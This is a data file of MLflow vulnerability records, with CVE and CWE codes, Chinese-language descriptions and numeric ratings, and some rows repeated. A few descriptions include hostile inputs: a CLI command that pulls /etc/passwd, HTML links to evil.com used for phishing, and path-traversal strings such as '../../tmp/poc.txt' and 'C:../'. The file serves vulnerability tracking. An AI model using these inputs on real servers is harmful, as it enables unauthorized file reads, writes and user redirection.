mlflow_mlflow,mlflow,,True,CVE-2023-6977,CWE-29,,MLflow 是一个用于简化机器学习开发的开源平台，支持实验跟踪、代码打包以及模型的共享和部署。在版本 2.9.2 之前的 MLflow 中，存在一个安全漏洞。该漏洞源于 `is_local_uri()` 函数未能正确验证 URI，攻击者可以利用此漏洞从主机服务器下载任意文件，包括任何主机服务器可以访问的远程位置的文件。该漏洞允许攻击者读取服务器上的敏感文件。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6909,CWE-29,,MLflow 是一个开源的平台，用于简化机器学习的开发，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。受影响的版本在处理特制的文件路径时存在路径遍历问题，攻击者可能利用此漏洞读取或写入限制目录外的文件，这主要是由于在特定函数 `validate_path_is_safe` 中对路径的不足消毒所致。利用此漏洞时，攻击者提交经过设计的文件路径，可能包括 `..\` 序列，造成对任意文件的访问。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6975,CWE-29,,mlflow 是一个开源的机器学习生命周期管理平台，具有实验跟踪、代码打包和模型共享等功能。存在路径遍历漏洞，攻击者可以通过特制的路径输入（利用目录遍历序列）来获取未授权的读或写权限，从而访问服务器上的文件。该漏洞源于对 FTP 模型中的路径验证的不当处理，允许攻击者进行远程代码执行，并检索数据和模型信息。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6976,CWE-434,,MLflow 是一个开放源代码的平台，用于简化机器学习开发，包括追踪实验、将代码打包为可重复运行的代码和共享及部署模型。受影响的版本存在目录遍历漏洞，通过在路径名中包含 `#` 可以绕过 `validate_path_is_safe()` 检查，从而允许攻击者向服务器上任意位置写入文件。该漏洞可以通过恶意的 `zip` 压缩包利用，导致路径遍历，最终在服务器的文件系统中写入恶意代码。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6974,CWE-918,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习项目的开发与管理。然而，MLflow 存在一个服务器端请求伪造 (SSRF) 漏洞。该漏洞的根本原因在于在处理 HTTP 请求时未能正确限制重定向行为，攻击者可以利用 `_download_file()` 函数触发此漏洞，访问内部资源并实现任意文件写入。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6940,CWE-77,,mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发、跟踪和部署。此漏洞源于对 jinja2 模板引擎的处理不当，攻击者可以利用其绕过安全限制，从而在受害者的系统上进行完整的命令执行。受影响的版本为 1.27.0 至 2.9.1，攻击者只需通过一次用户交互（例如下载恶意配置）即可发起攻击。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6831,CWE-29 CWE-22,,Mlflow是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发和部署。在版本2.9.2之前，Mlflow存在路径遍历漏洞。该漏洞的根本原因是对文件处理机制中传入的特殊输入没有进行适当的检查。攻击者可以通过对路径的URL编码来绕过安全验证。利用该漏洞，攻击者可以在受害者服务器上删除任意文件，具体取决于用户的权限。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6753,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在简化机器学习开发过程，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。在Mlflow的2.9.2之前版本中，存在路径遍历漏洞，此漏洞源于在加载数据集时未能正确处理URL路径，允许攻击者通过操控URL路径中的文件名，利用后斜杠来绕过目录限制，实现写入当前工作目录以外的文件。例如，通过构造恶意URL，用户可以被诱骗加载攻击者指定的文件，从而造成任意文件写入。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6709,CWE-1336,,Mlflow是一个机器学习生命周期的开源平台。该平台允许用户跟踪实验、打包代码为可重现的运行并共享和部署模型。Mlflow的2.9.2之前的版本存在安全漏洞，源于模板引擎中对特殊元素的处理不当。攻击者可以通过注入恶意输入到模板系统，从而在用户机器上执行任意代码。为了利用此漏洞，用户必须加载其在互联网上找到的配方配置。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6568,CWE-79,,Mlflow 是一个开源机器学习生命周期管理平台，允许用户跟踪实验、打包代码以及共享和部署模型。受影响版本在 2.9.0 之前，存在跨站脚本漏洞。攻击者可以通过在 POST 请求的 Content-Type 头中注入恶意代码，这些代码在缺乏适当消毒或转义的情况下反射回用户。这可能导致用户会话被劫持、敏感信息被窃取或在用户代理的上下文中执行其他恶意操作。,3,1
mlflow_mlflow,mlflow,,True,CVE-2023-43472,CWE-200,2023-12-05,MLflow 是一个用于管理机器学习生命周期的开源平台，提供了实验追踪、模型管理、项目打包等功能。MLflow 2.8.1版本及之前的版本存在一个安全漏洞，原因是特制 REST API 请求的处理不当。攻击者可以通过发送特制的 REST API 请求来获取敏感信息。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6014,CWE-598,,MLflow是一个开源的机器学习平台，旨在简化机器学习模型的开发和管理。此漏洞源于MLflow在其服务器和用户界面中实现基本身份验证的不当处理，允许攻击者绕过身份验证。具体而言，攻击者可以利用REST API创建用户/凭据集合，从而未授权访问模型、实验及系统中的其他重要数据。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-6015,CWE-22,,MLflow 是一个开源平台，用于简化机器学习开发，包括跟踪实验、将代码打包成可重现的运行并共享和部署模型。受影响的版本存在路径遍历漏洞，该漏洞源于在 `handlers.py` 中的检查被跳过。攻击者可以通过路径遍历攻击从 Windows 的根目录中突破，读取或写入主机上的敏感数据（可能包括 SSH 密钥）。此漏洞仅在 Windows 操作系统上可被利用，利用示例包括发送包含 `C:../` 的请求。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-1177,CWE-29 CWE-22,,MLflow是一个开源的平台，用于简化机器学习的开发，包括跟踪实验、将代码打包成可重复运行的方式以及共享和部署模型。在使用mlflow-server和mlflow-ui命令的情况下，存在路径遍历漏洞，攻击者可以利用此漏洞从主机服务器下载任意文件，包括与MLflow无关的文件。这一问题仅影响运行这些命令的用户，以及相关集成，比如在未受到限制的环境中使用此命令。,1,1
mlflow_mlflow,mlflow,,True,CVE-2022-0736,CWE-377,2022-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 中存在安全漏洞，该漏洞源于产品的tempfile.mktemp()函数未能正确处理多进程状态。攻击者可通过该漏洞创建同名临时文件。以下产品及版本受到影响：Mlflow 1.23.1 之前版本。",2,2
mlflow_mlflow,mlflow,,True,CVE-2023-4033,CWE-78,,Mlflow 是一个开源的机器学习生命周期管理平台，提供实验跟踪、模型管理等功能。版本 2.6.0 之前的 mlflow 存在操作系统命令注入漏洞。该漏洞的根本原因是 `backend.py` 文件中的 `predict()` 方法未能正确转义参数，导致攻击者可以向 `models predict` 操作的 CLI 参数中注入恶意命令。当系统使用不当时，攻击者能够执行任意操作系统命令。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-3765,CWE-36,,Mlflow 是一个开源的机器学习生命周期管理平台。受影响的版本在 validate_path_is_safe() 函数中存在路径遍历漏洞，导致对绝对 Windows 路径的处理不当。攻击者可以利用此漏洞列出、下载、写入和删除系统文件。此漏洞仅在运行 Windows 操作系统的主机上可被利用。,1,1
mlflow_mlflow,mlflow,,True,CVE-2023-1176,CWE-36,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习的开发过程，包括实验追踪、代码打包和模型共享及部署。如果使用早于 MLflow 2.2.1 的版本，且未限制谁可以查询其服务器，可能会受到远程文件存在检查漏洞的影响。该漏洞发生在运行 mlflow server 或 mlflow ui 命令时，由于未对模型名称进行适当验证，导致攻击者能够检查主机服务器上任意文件的存在性。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-3573,CWE-29 CWE-22,,Mlflow 是一个开源的机器学习开发平台，旨在简化模型的训练、注册和部署。该平台的漏洞源于其 `is_local_uri` 函数对 URI 的解析不当，使得攻击者能够绕过检查并读取系统上的任意文件。具体来说，该函数未能正确处理空或 'file' 方案的 URI，从而导致误判 URI 为非本地。利用此漏洞，攻击者可以通过创建恶意模型版本并巧妙构造 'source' 参数，读取到服务器根目录下至少两个目录层级内的敏感文件。,1,1
mlflow_mlflow,mlflow,,True,CVE-2024-1560,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在帮助用户简化机器学习模型的管理和部署。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于无法正确清理用户提供的路径，攻击者可以利用该漏洞删除服务器文件系统上的任意目录。该漏洞的根本原因是`local_artifact_repo.py`中的`delete_artifacts`函数存在额外的url反转操作，导致无法有效防止路径遍历序列的出现。攻击者可以利用`_delete_artifact_mlflow_artifacts`处理程序和`local_file_uri_to_path`函数中的双重解码过程来触发该漏洞。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-3848,CWE-29 CWE-22,,mlflow 是一个用于简化机器学习开发的开源平台，允许跟踪实验、将代码打包为可重现的运行，并分享和部署模型。受影响的版本 2.11.0 存在路径遍历漏洞，该漏洞源于对创建的 artifact URL 的片段部分验证不当。攻击者可以通过构造特定的 URL（使用 '#' 字符插入路径）来绕过验证，进而访问文件系统路径，从而读取任意文件，包括敏感信息如 SSH 和云密钥。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-4263,CWE-284,,Mlflow 是一个用于简化机器学习开发的开源平台，提供跟踪实验、将代码包装为可重复运行的代码以及共享和部署模型的功能。Mlflow 2.10.1 之前的版本在处理用户 EDIT 权限的 DELETE 请求时缺乏适当的验证，这导致低权限攻击者能够在未授权的情况下删除任何工件。这种漏洞的根本原因在于访问控制的错误实现，允许攻击者以其低权限删除包括目录在内的工件。这种不当访问控制使得原本只能读取和更新工件的用户能够进行删除操作。,3,1
mlflow_mlflow,mlflow,,True,CVE-2024-1558,CWE-22,,Mlflow 是一个机器学习生命周期的开源平台。该漏洞源于对 'source' 参数验证不当。在 `_create_model_version` 函数中，攻击者可以发送特制的 `source` 参数，绕过 `_validate_non_local_source_contains_relative_paths(source)` 函数的检查，从而获得对服务器上任意文件的读取访问权限。这一问题源于处理未加引号的URL字符及在模型版本创建时错误地使用原始 'source' 值，导致在与 `/model-versions/get-artifact` 处理程序交互时敏感文件暴露。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-1483,CWE-22,,Mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括跟踪实验、打包代码并分享和部署模型。Mlflow 2.9.2版本存在路径遍历漏洞，该漏洞源于对用户输入验证不足。攻击者可以通过构造特定的HTTP POST请求，利用 'artifact_location' 和 'source' 参数，使用包含 '#' 组件的本地URI，访问服务器上的任意文件。这种攻击利用了目录遍历，允许攻击者访问服务器上不应被公开的文件。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-1593,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该平台用于简化机器学习开发，包括实验跟踪、将代码打包为可重复运行的程序以及共享和部署模型。Mlflow存在路径遍历漏洞，该漏洞源于对URL参数处理不当。攻击者可以利用;字符在URL中传递路径遍历序列，从而操控URL的params部分，获得对系统中文件或目录的未授权访问。攻击者可以使用像'../'这样的路径序列，访问存储在文件系统中任意的文件或目录。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-1594,CWE-22,,Mlflow是一个机器学习生命周期的开源平台。该漏洞存在于Mlflow 2.9.2版本及更早版本中，攻击者可以利用该漏洞在创建实验时，通过操纵'artifact_location'参数来触发路径遍历攻击。在URI中使用片段组件'#'，攻击者可以读取服务器上任意文件。这个漏洞类似于CVE-2023-6909，但利用了URI中的不同组件来达到相同效果。,2,1
mlflow_mlflow,mlflow,,True,CVE-2023-6018,CWE-78,,MLflow 是一个开源的平台，用于简化机器学习的开发流程，包括实验的跟踪、代码的封装和模型的共享与部署。在受到影响的版本中，通过对 `/ajax-api/2.0/mlflow/model-versions/create` 的请求，存在操作系统命令注入漏洞。攻击者可以利用此漏洞覆盖 MLflow 服务器上的任意文件，从而在受影响的机器上执行命令并获取数据和模型信息。,1,1
mlflow_mlflow,mlflow,,True,CVE-2024-6838,CWE-400,,MLflow是一个开源的机器学习开发平台，旨在简化机器学习项目的管理，提供实验跟踪、模型部署等功能。在MLflow版本v2.13.2中，由于实验名称缺少限制，存在安全漏洞，允许创建或重命名实验时使用大量整数，这可能导致MLflow用户界面失去响应，从而导致拒绝服务。此外，在创建实验时，`artifact_location`参数也没有字符限制。,3,1
mlflow_mlflow,mlflow,,True,CVE-2025-0453,CWE-410,,MLFlow 是一个开源的机器学习平台，旨在简化机器学习工作流的管理。在 MLFlow 版本 2.17.2 中，`/graphql` 端点存在拒绝服务攻击（DoS）的漏洞。攻击者可以创建大量复杂的查询批次，反复请求特定实验下的所有运行记录，导致 MLFlow 分配的所有工作者被大量请求占用，无法响应其他请求。这一漏洞源于对资源消耗的未受控管理。,2,1
mlflow_mlflow,mlflow,,True,CVE-2025-52967,CWE-918,2025-06-23,MLflow是一款用于管理机器学习生命周期的开源平台，涵盖了实验跟踪、项目部署和模型管理等功能。该漏洞涉及MLflow中的gateway_proxy_handler组件，该组件负责处理网关路径请求，然而在版本3.1.0之前，其路径验证功能存在缺失。这种缺陷使得某些未经验证的输入可以通过此组件传递，可能导致非法请求被接收和处理。,3,2
mlflow_mlflow,mlflow,,True,CVE-2024-27134,CWE-276 CWE-367,2024-11-25,MLflow 是一个开源的平台，旨在简化机器学习开发，它包括了管理和跟踪实验、将代码打包成可重复的运行以及共享和部署模型的能力。在 MLflow 中，由于目录权限设置过多，使用 spark_udf 功能时存在本地特权升级的漏洞。这意味着攻击者可以通过利用这一漏洞获得更高的系统权限，从而执行未授权的操作。,2,0
mlflow_mlflow,mlflow,,True,CVE-2025-1473,CWE-352,,mlflow 是一个开源的机器学习平台，旨在管理机器学习生命周期的各个方面，包括实验跟踪、项目包装和模型部署。在版本 2.17.0 到 2.20.1 的注册功能中，存在跨站请求伪造（CSRF）漏洞。攻击者可以利用这一漏洞创建新账户，从而可在恶意用户的名义下执行未经授权的操作。这一漏洞的根本原因是对 CSRF 攻击缺乏足够的防护和验证，特别是在处理用户注册请求时。,2,1
mlflow_mlflow,mlflow,,True,CVE-2024-8859,CWE-29,,MLflow是一个开源的平台，旨在简化机器学习开发，包括跟踪实验、打包代码和共享模型。在MLflow的2.15.1版本中，发现了一个路径遍历漏洞，该漏洞源于dbfs服务的不当配置。具体而言，漏洞发生在`_validate_non_local_source_contains_relative_paths()`函数中，当`dbfs`服务被配置并挂载到本地目录而不是Databricks时，攻击者可以通过操纵`file:`协议中的URL读取任意文件，因为该实现未能适当清理路径之外的输入，如查询和参数。,2,1
mlflow_mlflow,mlflow,,True,CVE-2025-1474,CWE-521,,在 MLflow 版本 2.18 中，管理员可以在未设置密码的情况下创建新用户账户。MLflow 是一个开源的机器学习平台，旨在简化机器学习的开发和管理。由于缺乏对设置密码的要求，该漏洞可能导致未授权访问，从而引发安全风险。此外，这一做法违反用户账户安全管理的最佳实践。该漏洞已在版本 2.19.0 中修复。,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供实验跟踪、模型管理等功能。在测试过程中发现，当用户访问日志中的 PDF 工件时，存在定制 JavaScript 执行的漏洞。该漏洞是由项目的默认安装中使用的易受攻击的 PDFjs 封装导致的。攻击者可以通过上传特制的 PDF 文件来引发 JavaScript 的执行，从而影响其他用户。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow是一个开源的机器学习平台，允许数据科学家和开发者使用不同的工具进行机器学习模型的构建和管理。在AWS上，发现一个未被声明的S3存储桶，攻击者可以声称这个存储桶并获得对它的控制权。这种漏洞的根本原因是对S3存储桶的管理不当，导致存储桶处于可被恶意接管的状态。攻击者可通过直接访问未声明的S3存储桶地址，执行接管操作。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的整个生命周期，包括实验、重现和部署。该漏洞存在于 Github Actions 的工作流中，攻击者可以提交包含可执行代码的恶意 Pull Request，这些代码在没有适当授权的情况下执行，从而导致敏感令牌泄露并危及代码库的安全。</p>,1,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，旨在帮助数据科学家和开发人员管理机器学习生命周期。该漏洞存在于创建实验与模型的功能中，攻击者可以利用跨站请求伪造（CSRF）攻击来在未授权用户的情况下创建实验和模型。具体来说，当用户访问精心构造的网页时，该攻击可以自动提交请求以创建新的模型，如“test”。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>MLFlow 是一个用于机器学习操作的程序，允许工程师运行、记录和重现他们的实验与模型。当攻击者利用符号链接和日志记录功能时，可能导致内部机密文件的曝光。漏洞的根本原因在于使用 Python 的 `with open` 函数，在处理符号链接的过程中不当处理导致泄露。如果攻击者成功提取了符号链接的归档文件并存储在跟踪服务器上，就能够利用 MLFlow API 获取相关文件。一旦攻击者获得 SSH 密钥，则可能导致对其他模型及其相关数据的访问。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的开发、实验和部署。当一个页面未能设置适当的 X-Frame-Options 或 Content-Security-Policy HTTP 头时，攻击者可以在其控制的页面中通过 iframe 加载受影响的页面。这种漏洞的根本原因在于缺乏必要的防护措施。攻击者可通过在用户的浏览器中叠加一个虚假的用户界面，诱使受害者进行诸如鼠标点击和键盘输入等操作，进而在被攻击的应用中无意执行指令。</p>,4,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习生命周期管理工具，允许用户追踪实验、项目和最终模型。在使用 mlflow cli 命令下载工件时，存在本地文件包含漏洞，攻击者可以通过提供不安全的 URI 来下载服务器上任何位置的文件。攻击者可以利用这一漏洞，执行类似 'mlflow artifacts download -u /etc/passwd -d /home/ubuntu/test/' 的命令，将 /etc/passwd 的内容下载到本地目录，从而暴露敏感信息。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,"<p>mlflow是一个开源的机器学习平台，旨在简化并优化机器学习模型的管理和部署。当使用`dangerouslySetInnerHTML`方法渲染用户输入的内容时，如果未采取适当的输入验证，就会导致HTML注入漏洞。攻击者可以通过存储恶意HTML代码创建假网页，例如使用标记<a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">click here to get gift</a>来实施钓鱼攻击，将受害者重定向到另一个网站。</p>",3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow是一个用于机器学习生命周期管理的开源平台，支持多种机器学习模型的实验跟踪、项目管理和模型部署。该漏洞源于使用pickle.load函数不当，攻击者可以借此加载恶意构造的pickle文件。当用户从互联网下载一个模型并使用该框架检查模型训练结果时，可能会触发代码执行。具体的执行流程是，当检查'train'步骤时，会调用inspect函数，继而调用BaseCard.load方法加载卡片模型，这一过程可能导致任意代码执行。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习生命周期管理平台，允许用户轻松地构建和管理机器学习模型。该漏洞的根本原因在于 mlflow 在加载模型时使用了 Python 的原生 Unpickler，该组件对反序列化攻击存在脆弱性，允许恶意模型通过隐藏有效载荷来执行任意代码，包括操作系统命令。由于这一脆弱性，不仅在 mlflow.pyfunc.load_model 中存在，在 mlflow 的多个其他位置，如 mlflow.sklearn.load_model 和 mlflow.pytorch.pickle_module.py 中也有类似问题。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,<p>MLflow 是一个开源的机器学习平台，旨在帮助数据科学家和开发者管理整个机器学习生命周期。该漏洞存在于用户输入未被恰当验证和清理的情况下，导致攻击者能够通过 XSS 注入虚假的登录表单或欺骗性用户界面到合法网页中。攻击者可以在这些虚假表单中窃取敏感信息，例如用户名、密码或信用卡详细信息。具体地，在使用 `render_template_string` 函数时，如不对用户输入进行适当转义，用户控制的值即可能成为 JavaScript 代码的来源，最终导致跨站脚本攻击的发生。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>MLflow 是一个开源平台，用于管理机器学习生命周期，包括实验跟踪、项目打包和模型管理。在创建实验时，当使用 POST 请求向 /ajax-api/2.0/mlflow/experiments/create 发送包含相同名称的实验的请求时，系统原本应该检查该实验名称是否已经存在，并返回错误信息。然而，由于存在竞争条件，多个同时请求可以成功创建相同名称的实验。这种漏洞的根源在于对并发请求的处理不当，导致了一致性问题和安全隐患。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个用于管理机器学习生命周期的开源平台，它提供模型训练、记录和模型部署的功能。当用户上传数据集时，由于使用 MD5 哈希值作为数据集标识符，可能导致哈希冲突，从而阻止新的数据集上传。攻击者可以利用此漏洞，通过提前创建具有相同名称和内容的已知数据集，从而占用相应的MD5哈希值，导致其他用户无法上传同名数据集。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,"<p>MLflow 是一个用于管理机器学习生命周期的开源平台，支持实验记录、模型部署和系列管理。该平台存在HTML/XSS注入漏洞，攻击者可以通过在网页表单或输入字段中注入恶意代码，从而使用户在浏览网页时被重定向到恶意网站。攻击者可以利用该漏洞通过修改描述字段来注入HTML代码，例如用 <a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">submit your report here </a>，从而实现用户重定向。在用户保存后，该链接将出现在用户界面上，点击后会将用户重定向到恶意网站。</p>",2,1
mlflow_mlflow,mlflow,,True,,,,<p>MLflow 是一个开源的平台，旨在为机器学习项目提供管理和部署服务。该漏洞影响版本 2.5.0。由于在模型版本创建过程中未能正确处理输入参数，攻击者可以利用该漏洞向其他用户的账户注入恶意脚本。具体来说，攻击者在创建模型版本时，设置的运行链接（run_link）参数可以包含 JavaScript 代码。当受害者用户访问该链接时，恶意脚本将在其浏览器中执行，从而导致信息泄露或账户控制。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供了模型登记、追踪实验和模型部署等功能。该漏洞存在于 mlflow 的文件操作中，攻击者可以通过重写 YAML 文件中的敏感字段，导致远程代码执行或本地文件读取。具体来说，当调用 `write_yaml()` 函数并设置 `overwrite=True` 时，系统未能正确验证文件内容的有效性，攻击者能够覆盖关键属性如 `source` 和 `storage_location`，并在多种情况下利用此漏洞。</p>,1,1
mlflow_mlflow,mlflow,,True,CVE-2025-11201,CWE-22,2025-10-29,MLflow Tracking Server 是一个用于管理机器学习模型生命周期的开源平台，包括实验记录、模型注册和模型部署等功能。在该漏洞中，受影响组件在处理模型文件路径时，缺乏对用户输入路径的正确验证，导致攻击者能够构造恶意路径并触发文件操作。这种漏洞通常是由于未正确验证输入数据或未限制目录访问范围所引起的。攻击者可以利用构造的路径执行任意代码，具体地是在服务账户的权限上下文中执行代码。,1,2
mlflow_mlflow,scikit-learn,1.4.2,True,CVE-2024-5206,CWE-921 CWE-922,,scikit-learn 是一个基于 Python 的开源机器学习模块，支持数据挖掘和数据分析等功能。该漏洞源于 TfidfVectorizer 类在处理训练数据时，意外地将所有标记存储在 stop_words_ 属性中，而非仅存储进行 TF-IDF 计算所需的令牌子集。这种行为可能导致敏感信息泄露，例如密码或密钥，因为 stop_words_ 属性中可能包含本应被丢弃的标记。,3,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-0520,CWE-22,,Mlflow是一个开源的平台，用于简化机器学习开发的生命周期，包括实验跟踪、代码打包和模型共享与部署。该漏洞源于`mlflow.data.http_dataset_source.py`模块中操作系统命令的特殊元素未得到正确中和，攻击者可以通过操控`Content-Disposition`头部中的文件名或URL路径包含恶意输入来执行任意代码。此漏洞允许攻击者完全控制文件路径，通过路径遍历或绝对路径技术，实现任意文件写入，例如用'../../tmp/poc.txt'或'/tmp/poc.txt'。,1,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-3099,CWE-475,,Mlflow 是一个用于简化机器学习开发的开源平台，支持跟踪实验、打包可重复的运行和共享与部署模型。该漏洞源于对模型名称的验证不足，允许攻击者通过 URL 编码创建多个同名模型，因此可能导致拒绝服务（DoS），同时攻击者还可以利用此漏洞对数据模型进行污染。由于 URL 编码的模型在处理时被视为与其解码版本不同，从而导致了这一安全问题。,3,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-2928,CWE-29 CWE-22,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习开发过程，包括实验跟踪、代码打包以及模型的共享与部署。该平台存在安全漏洞，主要由于在解析 URI 片段时未能妥善验证其内容。攻击者可以通过操纵 URI 片段的部分，利用目录遍历序列如 '../' 来读取本地文件系统上的任意文件，甚至包括敏感文件如 '/etc/passwd'。该漏洞是对之前补丁的绕过，表明需要对 URI 的所有部分进行全面验证以防止本地文件包含攻击。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-27133,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 dataset table字段的清理，导致跨站脚本。",2,0
mlflow_mlflow,mlflow,2.7.1,True,CVE-2024-27132,CWE-79,2024-02-23,"Mlflow是一个机器学习生命周期的开源平台。
Mlflow 存在跨站脚本漏洞，该漏洞源于缺乏对 template变量的清理，导致跨站脚本。",2,0
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6977,CWE-29,,MLflow 是一个用于简化机器学习开发的开源平台，支持实验跟踪、代码打包以及模型的共享和部署。在版本 2.9.2 之前的 MLflow 中，存在一个安全漏洞。该漏洞源于 `is_local_uri()` 函数未能正确验证 URI，攻击者可以利用此漏洞从主机服务器下载任意文件，包括任何主机服务器可以访问的远程位置的文件。该漏洞允许攻击者读取服务器上的敏感文件。,1,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6909,CWE-29,,MLflow 是一个开源的平台，用于简化机器学习的开发，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。受影响的版本在处理特制的文件路径时存在路径遍历问题，攻击者可能利用此漏洞读取或写入限制目录外的文件，这主要是由于在特定函数 `validate_path_is_safe` 中对路径的不足消毒所致。利用此漏洞时，攻击者提交经过设计的文件路径，可能包括 `..\` 序列，造成对任意文件的访问。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6975,CWE-29,,mlflow 是一个开源的机器学习生命周期管理平台，具有实验跟踪、代码打包和模型共享等功能。存在路径遍历漏洞，攻击者可以通过特制的路径输入（利用目录遍历序列）来获取未授权的读或写权限，从而访问服务器上的文件。该漏洞源于对 FTP 模型中的路径验证的不当处理，允许攻击者进行远程代码执行，并检索数据和模型信息。,1,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6976,CWE-434,,MLflow 是一个开放源代码的平台，用于简化机器学习开发，包括追踪实验、将代码打包为可重复运行的代码和共享及部署模型。受影响的版本存在目录遍历漏洞，通过在路径名中包含 `#` 可以绕过 `validate_path_is_safe()` 检查，从而允许攻击者向服务器上任意位置写入文件。该漏洞可以通过恶意的 `zip` 压缩包利用，导致路径遍历，最终在服务器的文件系统中写入恶意代码。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6974,CWE-918,,MLflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习项目的开发与管理。然而，MLflow 存在一个服务器端请求伪造 (SSRF) 漏洞。该漏洞的根本原因在于在处理 HTTP 请求时未能正确限制重定向行为，攻击者可以利用 `_download_file()` 函数触发此漏洞，访问内部资源并实现任意文件写入。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6940,CWE-77,,mlflow 是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发、跟踪和部署。此漏洞源于对 jinja2 模板引擎的处理不当，攻击者可以利用其绕过安全限制，从而在受害者的系统上进行完整的命令执行。受影响的版本为 1.27.0 至 2.9.1，攻击者只需通过一次用户交互（例如下载恶意配置）即可发起攻击。,1,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6831,CWE-29 CWE-22,,Mlflow是一个开源的机器学习生命周期管理平台，旨在简化机器学习模型的开发和部署。在版本2.9.2之前，Mlflow存在路径遍历漏洞。该漏洞的根本原因是对文件处理机制中传入的特殊输入没有进行适当的检查。攻击者可以通过对路径的URL编码来绕过安全验证。利用该漏洞，攻击者可以在受害者服务器上删除任意文件，具体取决于用户的权限。,2,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6753,CWE-22,,Mlflow是一个机器学习生命周期的开源平台，旨在简化机器学习开发过程，包括跟踪实验、将代码打包成可重现的运行以及共享和部署模型。在Mlflow的2.9.2之前版本中，存在路径遍历漏洞，此漏洞源于在加载数据集时未能正确处理URL路径，允许攻击者通过操控URL路径中的文件名，利用后斜杠来绕过目录限制，实现写入当前工作目录以外的文件。例如，通过构造恶意URL，用户可以被诱骗加载攻击者指定的文件，从而造成任意文件写入。,1,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6709,CWE-1336,,Mlflow是一个机器学习生命周期的开源平台。该平台允许用户跟踪实验、打包代码为可重现的运行并共享和部署模型。Mlflow的2.9.2之前的版本存在安全漏洞，源于模板引擎中对特殊元素的处理不当。攻击者可以通过注入恶意输入到模板系统，从而在用户机器上执行任意代码。为了利用此漏洞，用户必须加载其在互联网上找到的配方配置。,1,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-6568,CWE-79,,Mlflow 是一个开源机器学习生命周期管理平台，允许用户跟踪实验、打包代码以及共享和部署模型。受影响版本在 2.9.0 之前，存在跨站脚本漏洞。攻击者可以通过在 POST 请求的 Content-Type 头中注入恶意代码，这些代码在缺乏适当消毒或转义的情况下反射回用户。这可能导致用户会话被劫持、敏感信息被窃取或在用户代理的上下文中执行其他恶意操作。,3,1
mlflow_mlflow,mlflow,2.7.1,True,CVE-2023-43472,CWE-200,2023-12-05,MLflow 是一个用于管理机器学习生命周期的开源平台，提供了实验追踪、模型管理、项目打包等功能。MLflow 2.8.1版本及之前的版本存在一个安全漏洞，原因是特制 REST API 请求的处理不当。攻击者可以通过发送特制的 REST API 请求来获取敏感信息。,2,1
